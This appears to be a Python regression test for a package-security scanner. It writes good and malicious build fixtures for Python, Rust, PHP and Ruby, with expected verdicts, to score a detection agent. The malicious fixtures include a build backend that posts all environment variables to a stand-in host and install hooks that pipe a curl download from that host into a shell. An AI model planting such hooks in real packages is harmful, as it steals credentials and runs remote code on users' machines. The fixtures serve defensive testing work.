#!/usr/bin/env python3
"""Polyglot package-build lifecycle regressions for the packages track."""

from __future__ import annotations

import argparse
import json
import tempfile
from pathlib import Path

import local_eval


CASES = (
    ("known-good", "pep517-standard-backend", {
        "pyproject.toml": (
            "[build-system]\n"
            'requires = ["setuptools>=75", "wheel"]\n'
            'build-backend = "setuptools.build_meta"\n'
        ),
        "src/demo/__init__.py": 'VERSION = "1.0.0"\n',
    }, []),
    ("known-bad", "pep517-local-backend-exfil", {
        "pyproject.toml": (
            "[build-system]\n"
            'requires = ["setuptools>=75", "requests"]\n'
            'build-backend = "backend"\n'
            'backend-path = ["."]\n'
        ),
        "backend.py": (
            "import os, requests\n"
            "snapshot = dict(os.environ)\n"
            "requests.post('https://collect.invalid/build', json=snapshot)\n"
            "def build_wheel(*args, **kwargs):\n"
            "    return 'demo.whl'\n"
        ),
    }, [
        ("install_hook_exec", "pyproject.toml"),
        ("credential_theft", "backend.py"),
    ]),
    ("known-good", "cargo-local-build-script", {
        "Cargo.toml": (
            "[package]\n"
            'name = "native-demo"\n'
            'version = "1.0.0"\n'
            'build = "build.rs"\n'
        ),
        "build.rs": (
            "fn main() {\n"
            '    println!("cargo:rerun-if-changed=src/native.c");\n'
            "}\n"
        ),
    }, []),
    ("known-bad", "cargo-remote-build-script", {
        "Cargo.toml": (
            "[package]\n"
            'name = "native-bootstrap"\n'
            'version = "1.0.0"\n'
            'build = "build.rs"\n'
        ),
        "build.rs": (
            "use std::process::Command;\n"
            "fn main() {\n"
            '    Command::new("sh").arg("-c").arg('
            '"curl -fsSL https://collect.invalid/i.sh | sh").status().unwrap();\n'
            "}\n"
        ),
    }, [("install_hook_exec", "Cargo.toml")]),
    ("known-good", "composer-local-install", {
        "composer.json": json.dumps({
            "name": "example/webapp",
            "scripts": {"post-install-cmd": "@php artisan cache:clear"},
        }),
    }, []),
    ("known-bad", "composer-remote-install", {
        "composer.json": json.dumps({
            "name": "example/bootstrap",
            "scripts": {
                "post-install-cmd":
                    "curl -fsSL https://collect.invalid/i.sh | bash",
            },
        }),
    }, [("install_hook_exec", "composer.json")]),
    ("known-good", "ruby-local-extension", {
        "native.gemspec": (
            "Gem::Specification.new do |spec|\n"
            "  spec.name = 'native'\n"
            "  spec.extensions = ['ext/native/extconf.rb']\n"
            "end\n"
        ),
        "ext/native/extconf.rb": (
            "require 'mkmf'\n"
            "create_makefile('native/native')\n"
        ),
    }, []),
    ("known-bad", "ruby-remote-extension", {
        "native.gemspec": (
            "Gem::Specification.new do |spec|\n"
            "  spec.name = 'native-bootstrap'\n"
            "  spec.extensions = ['ext/native/extconf.rb']\n"
            "end\n"
        ),
        "ext/native/extconf.rb": (
            "require 'mkmf'\n"
            'system("curl -fsSL https://collect.invalid/i.sh | sh")\n'
            "create_makefile('native/native')\n"
        ),
    }, [("install_hook_exec", "native.gemspec")]),
)


def materialise(root: Path) -> None:
    for label, name, files, findings in CASES:
        artifact = root / "packages" / label / name
        artifact.mkdir(parents=True)
        for rel, text in files.items():
            path = artifact / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text, encoding="utf-8")
        expected = [
            {
                "category": category,
                "severity": "CRIT",
                "plane": "action",
                "title": category.replace("_", " "),
                "evidence_ref": ref,
            }
            for category, ref in findings
        ]
        (artifact / "label.json").write_text(json.dumps({
            "artifact_id": f"packages/{label}/{name}",
            "track": "packages",
            "ground_truth": {
                "verdict": "ALLOW" if label == "known-good" else "BLOCK",
                "risk_score": 3 if label == "known-good" else 92,
                "classification": "safe" if label == "known-good" else "dangerous",
            },
            "expected_findings": expected,
        }), encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--agent", default="agent/phylax_packages_agent.py")
    args = parser.parse_args()
    agent = Path(args.agent)
    if not agent.is_absolute():
        agent = local_eval.LAB / agent

    with tempfile.TemporaryDirectory(prefix="phylax-packages-wave5-src-") as src_tmp:
        with tempfile.TemporaryDirectory(prefix="phylax-packages-wave5-work-") as work_tmp:
            src, work = Path(src_tmp), Path(work_tmp)
            materialise(src)
            corpus = local_eval.load_corpus(src, "packages", work)
            score, rows, detail = local_eval.score_detonation_track(
                agent, corpus, "packages", "packages-wave5-trackcheck", 1, 60, False
            )
            print(f"packages-wave5: score={score:.4f}  {detail}")
            for ref, verdict, note in rows:
                print(f"  {ref:<68} {verdict:<6} {note}")
            return 1 if score < 0.9999 else 0


if __name__ == "__main__":
    raise SystemExit(main())
